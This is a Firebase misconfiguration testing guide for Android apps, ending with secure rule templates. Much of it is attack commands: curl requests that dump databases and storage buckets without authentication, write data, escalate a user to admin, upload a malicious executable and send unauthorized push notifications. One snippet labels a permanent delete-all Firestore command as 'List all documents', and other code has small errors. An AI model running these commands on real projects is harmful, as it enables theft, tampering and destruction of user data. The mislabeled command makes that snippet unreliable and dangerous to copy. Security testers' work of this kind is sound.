# Firebase Misconfiguration Testing Guide

## Overview

Firebase is one of the most widely used backend platforms for Android applications, making misconfigurations a common and critical security finding. Firebase services include:

- **Firebase Realtime Database** - NoSQL database with real-time sync
- **Cloud Firestore** - Next-generation NoSQL database
- **Firebase Storage** - Cloud storage for files
- **Firebase Cloud Messaging (FCM)** - Push notifications
- **Firebase Remote Config** - Feature flags and dynamic configuration
- **Firebase Authentication** - User authentication
- **Firebase Functions** - Serverless backend code
- **Firebase Hosting** - Static web hosting

### Common Misconfigurations

1. **Unauthenticated read/write access** on Realtime Database
2. **Public Firestore collections** with open security rules
3. **Unrestricted Firebase Storage buckets** - anyone can read/upload
4. **Exposed API keys** in google-services.json or code
5. **Leaked Firebase project IDs** allowing database discovery
6. **Overly permissive Remote Config** - sensitive data exposed
7. **Missing client-side security rules validation**

## Discovery Phase

### Finding Firebase URLs in Decompiled APK

#### 1. Extract APK and Decompile

```bash
# Decompile APK to get source
apktool d target.apk -o decompiled

# Extract for static analysis
unzip target.apk -d extracted
```

#### 2. Grep Patterns for Firebase URLs

```bash
# Find Firebase Realtime Database URLs
grep -R -E "firebaseio\.com" decompiled/ --include="*.smali" --include="*.xml"

# Find Firebase Storage buckets
grep -R -E "firebasestorage\.googleapis\.com|appspot\.com" decompiled/ --include="*.smali" --include="*.xml"

# Find Firebase project IDs
grep -R -E "firebase-app\.com|firebase\.google\.com" decompiled/ --include="*.smali" --include="*.xml"

# Find Firebase initialization
grep -R -E "FirebaseApp\.getInstance|initializeApp|firebaseOptions" decompiled/ --include="*.smali"

# Find google-services.json
find decompiled/ -name "google-services.json" -o -name "google-services.json.txt"

# Find API keys
grep -R -E "AIza[A-Za-z0-9_-]{35}" decompiled/ --include="*.xml" --include="*.smali"
```

### Extracting Firebase Project ID from google-services.json

The google-services.json file (typically at `app/google-services.json` or inside APK) contains:

```json
{
  "project_info": {
    "project_number": "123456789012",
    "firebase_url": "https://your-project.firebaseio.com",
    "project_id": "your-project-id",
    "storage_bucket": "your-project.appspot.com"
  },
  "client": [...]
}
```

```bash
# Extract from APK
unzip -p target.apk google-services.json 2>/dev/null | grep -oE '"project_id":\s*"[^"]+"'

# Find in decompiled sources
grep -R -E '"project_id":\s*"[^"]+"' decompiled/
```

### Finding Firebase Realtime Database URLs

```bash
# Standard pattern
grep -R -E 'https://[a-z0-9-]+\.firebaseio\.com' decompiled/ --include="*.smali" --include="*.xml"

# With region
grep -R -E 'https://[a-z0-9-]+-[a-z]+\.firebaseio\.com' decompiled/ --include="*.smali"
```

### Finding Firestore URLs

```bash
# Firestore database URLs
grep -R -E 'firestore\.googleapis\.com' decompiled/ --include="*.smali" --include="*.xml"

# Project-specific Firestore
grep -R -E 'projects/[a-z0-9-]+/databases/\(default\)' decompiled/ --include="*.smali"
```

### Finding Firebase Storage Buckets

```bash
# Storage bucket URLs
grep -R -E 'firebasestorage\.googleapis\.com/v0/b/[^/]+/o' decompiled/ --include="*.smali"

# Bucket names (gs://)
grep -R -E 'gs://[a-z0-9-]+\.appspot\.com' decompiled/ --include="*.smali"

# Bucket extraction from code
grep -R -E '"storage_bucket":\s*"[^"]+"|getReference\(\)|getReferenceFromUrl' decompiled/ --include="*.smali"
```

### Finding Firebase Cloud Messaging (FCM) Keys

```bash
# Sender ID / project number
grep -R -E '"sender_id":\s*"[0-9]+' decompiled/ --include="*.xml"

# FCM API key
grep -R -E '"api_key":\s*\[{"current_key":\s*"AIza[A-Za-z0-9_-]{35}' decompiled/ --include="*.xml"

# In code initialization
grep -R -E "FirebaseMessaging\.getInstance|setAutoInitEnabled|getToken" decompiled/ --include="*.smali"
```

## Testing Firebase Realtime Database

### Unauthenticated Read Testing

```bash
# Test read access without authentication
curl -s "https://your-project.firebaseio.com/.json" | jq '.'

# Test specific path
curl -s "https://your-project.firebaseio.com/users/.json" | jq '.'

# Test with pretty print
curl -s "https://your-project.firebaseio.com/.json?print=pretty" | jq '.'
```

### Unauthenticated Write Testing

```bash
# Test write access (PUT)
curl -X PUT "https://your-project.firebaseio.com/test_node.json" \
  -d '{"test": "data", "timestamp": 1234567890}'

# Test write access (POST)
curl -X POST "https://your-project.firebaseio.com/messages.json" \
  -d '{"message": "test", "user": "anonymous"}'

# Test update (PATCH)
curl -X PATCH "https://your-project.firebaseio.com/users/user1.json" \
  -d '{"role": "admin"}'
```

### Rules Enumeration

```bash
# Attempt to read security rules
curl -s "https://your-project.firebaseio.com/.settings/rules.json" | jq '.'

# Alternative method
curl -s "https://your-project.firebaseio.com/.settings/rules/.json" | jq '.'

# Check if rules are accessible
curl -I "https://your-project.firebaseio.com/.settings/rules.json"
```

### Data Exfiltration Patterns

```bash
# Dump entire database (if readable)
curl -s "https://your-project.firebaseio.com/.json?shallow=true" | jq '.'

# Download specific collection
curl -s "https://your-project.firebaseio.com/users.json" -o users_data.json

# Check for sensitive data patterns
curl -s "https://your-project.firebaseio.com/users.json" | jq '.[] | .email, .phone, .password'

# Test depth limits
curl -s "https://your-project.firebaseio.com/.json?limitToFirst=100" | jq '.'
```

## Testing Firestore

### Unauthenticated Access Testing

```bash
# Firestore requires gRPC/API, use firebase-cli or python scripts

# Using gurl (with service account if available)
curl -X POST "https://firestore.googleapis.com/v1/projects/your-project/databases/(default)/documents:runQuery" \
  -H "Content-Type: application/json" \
  -d '{
    "structuredQuery": {
      "from": [{"collectionId": "users"}]
    }
  }'

# List all documents in a collection
curl -X GET "https://firestore.googleapis.com/v1/projects/your-project/databases/(default)/documents/users" \
  -H "Authorization: Bearer YOUR_TOKEN"
```

**Note:** To test with authentication, obtain an OAuth2 token via:
1. Firebase CLI: `firebase auth:print-access-token`
2. Google Cloud CLI: `gcloud auth print-access-token`

For testing unauthenticated access, simply omit the Authorization header entirely.

### Using Firebase CLI

```bash
# Install firebase-cli
npm install -g firebase-tools

# List all documents (if rules allow)
firebase firestore:delete --all-collections --project your-project-id -y
```

⚠️ **WARNING**: This command **PERMANENTLY DELETES** all data. Only use in authorized testing environments. For read-only testing, use `firebase firestore:export` or curl GET requests instead.

```bash
# Export all data (read-only alternative)
firebase firestore:export --project your-project-id --output-dir ./firestore_export
```

### Python Testing Script

```python
# Requires: pip install firebase-admin google-cloud-firestore
# Note: This requires a service account key file
import firebase_admin
from firebase_admin import credentials, firestore

# Initialize with service account (if available)
# cred = credentials.Certificate('path/to/serviceAccountKey.json')
# firebase_admin.initialize_app(cred)
# db = firestore.Client(project='your-project-id')

# Test without credentials (anonymous)
# NOTE: firestore.Client() requires GOOGLE_APPLICATION_CREDENTIALS env var or runs in GCP context
try:
    db = firestore.Client(project='your-project-id')
    docs = db.collection('users').stream()
    for doc in docs:
        print(f'{doc.id} => {doc.to_dict()}')
except Exception as e:
    print(f"Access denied: {e}")
```

## Testing Firebase Storage

### Public Bucket Access

```bash
# Test read access to bucket
curl -I "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o"

# List files (if public)
curl "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?list=true&prefix=/" | jq '.'

# Download file without auth
curl "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o/path%2Fto%2Ffile.jpg?alt=media" -o file.jpg

# Check bucket ACL
curl -I "https://storage.googleapis.com/your-project.appspot.com/"
```

### File Enumeration

```bash
# List all files in bucket
curl "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?list=true&maxResults=100" | jq '.'

# Enumerate by prefix
curl "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?list=true&prefix=users/" | jq '.'

# Search for specific file types
curl "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?list=true&prefix=images/" | jq '.[] | select(.name | test("\\.(jpg|png|pdf)$"))'
```

### Upload Without Auth

```bash
# Upload test file
curl -X POST "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?uploadType=media&name=test.txt" \
  -H "Content-Type: text/plain" \
  -d "This is a test upload"

# Upload with metadata
curl -X POST "https://firebasestorage.googleapis.com/v0/b/your-project.appspot.com/o?uploadType=media&name=maldoc.exe" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malicious.exe
```

## Testing Firebase Remote Config

### Configuration Enumeration

```bash
# Direct API access to Remote Config
curl "https://firebaseremoteconfig.googleapis.com/v1/projects/your-project/remoteConfig" \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.'

# Test if config is public
curl -I "https://firebaseremoteconfig.googleapis.com/v1/projects/your-project/remoteConfig"
```

**Note:** This API requires OAuth2 authentication. Use `gcloud auth print-access-token` to obtain a token for testing.

### Feature Flag Manipulation

```bash
# Check current config values
curl "https://your-project.firebaseio.com/remote_config/.json" | jq '.'

# Test for sensitive data exposure
curl "https://your-project.firebaseio.com/remote_config/.json" | jq '.[] | select(.value | test("api|key|secret|token", "i"))'

# Check for feature flags that expose functionality
curl "https://your-project.firebaseio.com/remote_config/.json" | jq '.[] | select(.key | test("admin|debug|test", "i"))'
```

## Testing Firebase Cloud Messaging

### API Key Leakage

#### FCM v1 API (Current)

**Note:** The FCM HTTP v1 API uses OAuth2 tokens: `Authorization: Bearer <ACCESS_TOKEN>`.

```bash
# Test FCM v1 API (requires OAuth2 token)
curl -X POST "https://fcm.googleapis.com/v1/projects/your-project-id/messages:send" \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "topic": "test",
      "notification": {
        "title": "Security Test",
        "body": "This is a security test message"
      }
    }
  }'
```

### Unauthorized Push Notifications

#### FCM v1 API Testing

```bash
# Send to specific device token via v1 API
curl -X POST "https://fcm.googleapis.com/v1/projects/your-project-id/messages:send" \
  -H "Authorization: Bearer ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "token": "DEVICE_TOKEN_HERE",
      "data": {
        "action": "admin_reset"
      }
    }
  }'
```

## Static Analysis Patterns

### Finding google-services.json Content

```bash
# Extract complete google-services.json
find decompiled/ -name "google-services.json" -exec cat {} \;

# Search for embedded config in smali
grep -R -E '"project_id":|"firebase_url":|"storage_bucket":|"api_key":|"current_key":' decompiled/ --include="*.smali"

# Find Firebase project number
grep -R -E '"project_number":\s*"([0-9]+)"' decompiled/ --include="*.smali" --include="*.xml"
```

### Finding Firebase URLs in Code

```bash
# Realtime Database URLs
grep -R -E 'firebaseio\.com|https://[^/]+\.firebaseio\.com' decompiled/ --include="*.smali"

# Firestore URLs
grep -R -E 'firestore\.googleapis\.com|projects/[^/]+/databases' decompiled/ --include="*.smali"

# Storage URLs
grep -R -E 'firebasestorage\.googleapis\.com|\.appspot\.com|gs://' decompiled/ --include="*.smali"

# Dynamic URL construction
grep -R -E 'String\.format.*firebase|StringBuilder.*firebase' decompiled/ --include="*.smali"
```

### Finding API Keys

```bash
# Firebase API keys (AIza format)
grep -R -E 'AIza[A-Za-z0-9_-]{35}' decompiled/ --include="*.smali" --include="*.xml"

# Google Cloud API keys
grep -R -E 'GOOG[A-Za-z0-9_-]{30,40}' decompiled/ --include="*.smali" --include="*.xml"

# Base64 encoded keys
grep -R -E 'Bearer [A-Za-z0-9+/]{50,}=' decompiled/ --include="*.smali"
```

### Finding Firebase Initialization Code

```bash
# FirebaseApp initialization
grep -R -E 'FirebaseApp\.getInstance\(|initializeApp|FirebaseOptions\.Builder' decompiled/ --include="*.smali"

# Database initialization
grep -R -E 'FirebaseDatabase\.getInstance|getReference|child\(' decompiled/ --include="*.smali"

# Storage initialization
grep -R -E 'FirebaseStorage\.getInstance|getReferenceFromUrl|getReference\(\)' decompiled/ --include="*.smali"

# Auth initialization
grep -R -E 'FirebaseAuth\.getInstance|signInWith|createUserWithEmailAndPassword' decompiled/ --include="*.smali"

# Messaging initialization
grep -R -E 'FirebaseMessaging\.getInstance|getToken|subscribeToTopic' decompiled/ --include="*.smali"
```

## Dynamic Testing

### Frida Scripts to Intercept Firebase Calls

```javascript
// Intercept Firebase Database reads
Java.perform(function() {
    var DatabaseReference = Java.use('com.google.firebase.database.DatabaseReference');

    DatabaseReference.addValueEventListener.overload('com.google.firebase.database.ValueEventListener').implementation = function(listener) {
        console.log('[Firebase] Database path:', this.toString());
        console.log('[Firebase] Setting value listener');
        return this.addValueEventListener(listener);
    };
});

// Intercept Firebase writes
Java.perform(function() {
    var DatabaseReference = Java.use('com.google.firebase.database.DatabaseReference');

    DatabaseReference.setValue.overload('java.lang.Object').implementation = function(value) {
        console.log('[Firebase] Write to path:', this.toString());
        console.log('[Firebase] Value:', value.toString());
        return this.setValue(value);
    };
});

// Intercept Firebase Storage uploads
Java.perform(function() {
    var StorageReference = Java.use('com.google.firebase.storage.StorageReference');

    StorageReference.putBytes.overload('[B').implementation = function(data) {
        console.log('[Firebase] Storage upload to:', this.toString());
        console.log('[Firebase] Data size:', data.length);
        return this.putBytes(data);
    };
});

// Intercept FCM token
Java.perform(function() {
    var FirebaseMessaging = Java.use('com.google.firebase.messaging.FirebaseMessaging');

    FirebaseMessaging.getToken.implementation = function() {
        var token = this.getToken();
        console.log('[Firebase] FCM Token:', token);
        return token;
    };
});
```

### Network Traffic Analysis

```bash
# Monitor Firebase traffic with mitmproxy
mitmproxy --set block_global=false

# Look for Firebase endpoints:
# - *.firebaseio.com (Realtime Database)
# - firestore.googleapis.com (Firestore)
# - firebasestorage.googleapis.com (Storage)
# - fcm.googleapis.com (FCM)
# - firebaseremoteconfig.googleapis.com (Remote Config)

# Export traffic for analysis
mitmdump -w firebase_traffic.pcap

# Analyze with tshark
tshark -r firebase_traffic.pcap -Y "http.host contains firebase" -T fields -e http.request.method -e http.request.uri -e http.file_data
```

### Burp Suite Interception

1. **Configure Burp Proxy** and install CA certificate on device
2. **Set up Burp extensions**:
   - `Burp Suite - Firebase Security Rules Auditor`
   - `Burp Suite - JSON Formatter`
3. **Test endpoints**:
   - Send requests to discovered Firebase URLs
   - Test for unauthenticated access
   - Try different HTTP methods (GET, POST, PUT, PATCH, DELETE)
4. **Analyze responses**:
   - Check for 200 OK responses without auth headers
   - Look for data leakage in JSON responses
   - Verify CORS configuration

```bash
# Test with Burp Repeater
GET https://your-project.firebaseio.com/.json

# Try PUT without auth
PUT https://your-project.firebaseio.com/test.json
Content-Type: application/json

{"test": "data"}
```

## Real-World Examples

### Common Misconfiguration Patterns

1. **Open Realtime Database Rules**:
```json
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

2. **Public Firestore Collection**:
```json
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /users/{userId} {
      allow read: if true;
      allow write: if false;
    }
  }
}
```

3. **Unrestricted Storage Bucket**:
```json
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if true;
    }
  }
}
```

### Bug Bounty Case Studies

#### Case 1: User Database Exposure (HackerOne - $10,000)

**Finding**: Realtime Database rules allowed unauthenticated read access to all users
```
GET https://app.firebaseio.com/users.json
Response: 200 OK
```
**Data exposed**:
- Email addresses
- Phone numbers
- User locations
- Profile pictures (storage URLs)

**Impact**: Complete user data disclosure
**CVSS Score**: 9.1 (Critical)

#### Case 2: Storage Bucket Write Access (Bugcrowd - $5,000)

**Finding**: Firebase Storage allowed public uploads
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/app.appspot.com/o?uploadType=media&name/malware.exe" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @malware.exe
```
**Impact**: Could host malware on company's domain
**CVSS Score**: 8.2 (High)

#### Case 3: Remote Config API Key Leak (Intigriti - $7,500)

**Finding**: API key in decompiled app allowed Remote Config manipulation
```bash
grep -E "AIza[A-Za-z0-9_-]{35}" decompiled/
Found: AIzaSyBXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
**Impact**: Could modify app behavior, expose beta features
**CVSS Score**: 7.5 (High)

## Remediation

### Security Rules Templates

#### Realtime Database (Secure)

```json
{
  "rules": {
    ".read": false,
    ".write": false,
    "users": {
      "$uid": {
        ".read": "auth != null && auth.uid == $uid",
        ".write": "auth != null && auth.uid == $uid"
      }
    },
    "public": {
      ".read": true,
      ".write": "auth != null && auth.token.admin == true"
    }
  }
}
```

#### Firestore (Secure)

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // Users can read/write their own data
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // Public data (read-only)
    match /public/{document=**} {
      allow read: if true;
      allow write: if false;
    }

    // Admin-only data
    match /admin/{document=**} {
      allow read, write: if request.auth != null && request.token.admin == true;
    }
  }
}
```

#### Firebase Storage (Secure)

```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    // User-specific uploads
    match /users/{userId}/{allPaths=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    // Public images
    match /images/{allPaths=**} {
      allow read: if true;
      allow write: if false;
    }

    // No global access
    match /{allPaths=**} {
      allow read, write: if false;
    }
  }
}
```

### Least Privilege Configuration

1. **Remove google-services.json from APK**:
   - Store it in secure backend
   - Fetch it at runtime from authenticated endpoint
   - Use ProGuard/R8 to obfuscate any remaining references

2. **Use Firebase App Check**:
   ```javascript
   // Enable App Check in Android app
   FirebaseAppCheck.getInstance().installAppCheckProviderFactory(
       PlayIntegrityAppCheckProviderFactory.getInstance()
   );
   ```

3. **Restrict API keys in Google Cloud Console**:
   - Set referrer restrictions
   - Set IP address restrictions (for backend)
   - Set package name/fingerprint restrictions
   - Enable API key restrictions

4. **Security Rules Best Practices**:
   - Default to deny all (`.read: false`, `.write: false`)
   - Use Firebase Authentication (`request.auth`)
   - Validate data structure and content
   - Implement rate limiting at the application level
   - Regularly audit rules and test for bypasses

5. **Monitoring and Alerts**:
   ```javascript
   // Set up Cloud Monitoring for unusual access patterns
   firebase functions
   exports.monitorDatabaseAccess = functions.database.ref('/users/{userId}')
     .onWrite((change, context) => {
       const admin = require('firebase-admin');
       admin.database().ref('/admin/logs/').push({
         timestamp: admin.database.ServerValue.TIMESTAMP,
         userId: context.params.userId,
         action: change.after.exists() ? 'write' : 'delete'
       });
     });
   ```

## Quick Reference Commands

```bash
# Firebase URL discovery
grep -R -E 'firebaseio\.com|firebasestorage\.googleapis\.com|firestore\.googleapis\.com' decompiled/ --include="*.smali"

# Project ID extraction
grep -R -E '"project_id":|"project_number":' decompiled/ --include="*.xml" --include="*.json"

# API key extraction
grep -R -E 'AIza[A-Za-z0-9_-]{35}' decompiled/ --include="*.smali" --include="*.xml"

# Database read test
curl -s "https://PROJECT.firebaseio.com/.json" | jq '.'

# Database write test
curl -X PUT "https://PROJECT.firebaseio.com/test.json" -d '{"test": "data"}'

# Storage list test
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT.appspot.com/o?list=true" | jq '.'

# Firebase initialization code
grep -R -E 'FirebaseApp\.getInstance|initializeApp' decompiled/ --include="*.smali"
```

## References

- Firebase Security Documentation: https://firebase.google.com/docs/security
- Firebase Security Rules: https://firebase.google.com/docs/rules
- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- Firebase CLI: https://firebase.google.com/docs/cli
